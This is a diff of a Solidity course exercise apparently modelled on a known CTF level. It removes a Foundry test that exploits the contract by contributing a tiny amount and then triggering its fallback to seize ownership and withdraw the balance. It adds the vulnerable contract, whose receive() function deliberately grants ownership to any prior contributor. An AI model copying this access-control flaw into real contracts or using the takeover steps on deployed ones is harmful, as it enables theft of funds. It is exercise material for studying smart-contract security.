@@ -1,42 +1,38 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
 
-import "forge-std/Test.sol";
-import "../src/Assignment11.sol";
+contract Assignment11 {
+    mapping(address => uint256) public contributions;
+    address public owner;
 
-contract Assignment11ExploitTest is Test {
-    Assignment11 public target;
-    address public attacker;
-
-    function setUp() public {
-        attacker = makeAddr("attacker");
-        vm.deal(attacker, 1 ether);
-
-        target = new Assignment11();
-        vm.deal(address(target), 1 ether);
+    constructor() {
+        owner = msg.sender;
+        contributions[msg.sender] = 1000 * (1 ether);
     }
 
-    function testExploit() public {
-        vm.startPrank(attacker);
-
-        // Contribute < 0.001 ether
-        target.contribute{value: 0.0005 ether}();
-
-        // Trigger fallback
-        (bool success, ) = address(target).call{value: 0.0001 ether}("");
-        require(success, "Fallback failed");
-
-        assertEq(target.owner(), attacker, "Ownership not transferred");
-
-        // Withdraw funds
-        uint256 before = attacker.balance;
-        target.withdraw();
-        uint256 afterBalance = attacker.balance;
-
-        assertGt(afterBalance, before, "No funds received");
-
-        vm.stopPrank();
+    modifier onlyOwner() {
+        require(msg.sender == owner, "caller is not the owner");
+        _;
     }
 
-    receive() external payable {}
+    function contribute() public payable {
+        require(msg.value < 0.001 ether);
+        contributions[msg.sender] += msg.value;
+        if (contributions[msg.sender] > contributions[owner]) {
+            owner = msg.sender;
+        }
+    }
+
+    function getContribution() public view returns (uint256) {
+        return contributions[msg.sender];
+    }
+
+    function withdraw() public onlyOwner {
+        payable(owner).transfer(address(this).balance);
+    }
+
+    receive() external payable {
+        require(msg.value > 0 && contributions[msg.sender] > 0);
+        owner = msg.sender;
+    }
 }
